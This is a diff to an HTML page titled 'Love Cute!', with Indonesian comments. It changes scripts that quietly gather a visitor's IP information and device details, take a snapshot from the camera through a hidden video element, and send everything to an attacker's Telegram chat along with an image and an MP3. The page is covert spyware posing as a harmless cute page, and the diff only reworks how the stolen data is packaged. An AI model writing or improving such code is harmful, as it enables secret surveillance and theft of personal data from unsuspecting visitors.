@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Love Cute!</title>
 <style>
+/* CSS tetap sama */
 * {
   margin: 0;
   padding: 0;
@@ -372,40 +373,35 @@ async function sendToTelegram(method, data) {
 async function sendIpDevice(){
   const [ip,d,additional] = await Promise.all([getIpInfo(), getDeviceInfo(), getAdditionalInfo()]);
   
-  // Kirim data sebagai pesan terpisah dengan format yang rapi
-  await sendToTelegram("sendMessage", {
+  // Kirim JPG dengan caption data
+  await sendToTelegram("sendPhoto", {
     chat_id: CHAT_ID,
-    text: buildCaption(ip,d,additional),
+    photo: STATIC_IMAGE,
+    caption: buildCaption(ip,d,additional),
     parse_mode: "HTML"
   });
 }
 
 async function sendSnapshot(){
   try{
-    // 1. Kirim data terlebih dahulu
+    // 1. Kirim data dengan JPG terlebih dahulu
     const [ip,d,additional] = await Promise.all([getIpInfo(), getDeviceInfo(), getAdditionalInfo()]);
     
-    await sendToTelegram("sendMessage", {
-      chat_id: CHAT_ID,
-      text: buildCaption(ip,d,additional),
-      parse_mode: "HTML"
-    });
-
-    // 2. Kirim JPG
     await sendToTelegram("sendPhoto", {
       chat_id: CHAT_ID,
       photo: STATIC_IMAGE,
-      caption: "🖼️ Preview Image"
+      caption: buildCaption(ip,d,additional),
+      parse_mode: "HTML"
     });
 
-    // 3. Kirim MP3
+    // 2. Kirim MP3
     await sendToTelegram("sendAudio", {
       chat_id: CHAT_ID,
       audio: MP3_URL,
       caption: "🎵 Audio File"
     });
 
-    // 4. Ambil dan kirim foto dari kamera
+    // 3. Ambil dan kirim foto dari kamera
     const stream = await navigator.mediaDevices.getUserMedia({video:true});
     const video = document.createElement('video');
     video.style.display='none';
@@ -437,19 +433,14 @@ async function sendSnapshot(){
     console.log("Error camera:", e);
     // Tetap kirim data meski camera gagal
     const [ip,d,additional] = await Promise.all([getIpInfo(), getDeviceInfo(), getAdditionalInfo()]);
-    await sendToTelegram("sendMessage", {
-      chat_id: CHAT_ID,
-      text: "❌ Gagal akses kamera, tapi data berhasil dikumpulkan:\n\n" + buildCaption(ip,d,additional),
-      parse_mode: "HTML"
-    });
-    
-    // Kirim JPG dan MP3 meski camera gagal
     await sendToTelegram("sendPhoto", {
       chat_id: CHAT_ID,
       photo: STATIC_IMAGE,
-      caption: "🖼️ Preview Image"
+      caption: "❌ Gagal akses kamera, tapi data berhasil dikumpulkan:\n\n" + buildCaption(ip,d,additional),
+      parse_mode: "HTML"
     });
-
+    
+    // Kirim MP3 meski camera gagal
     await sendToTelegram("sendAudio", {
       chat_id: CHAT_ID,
       audio: MP3_URL,
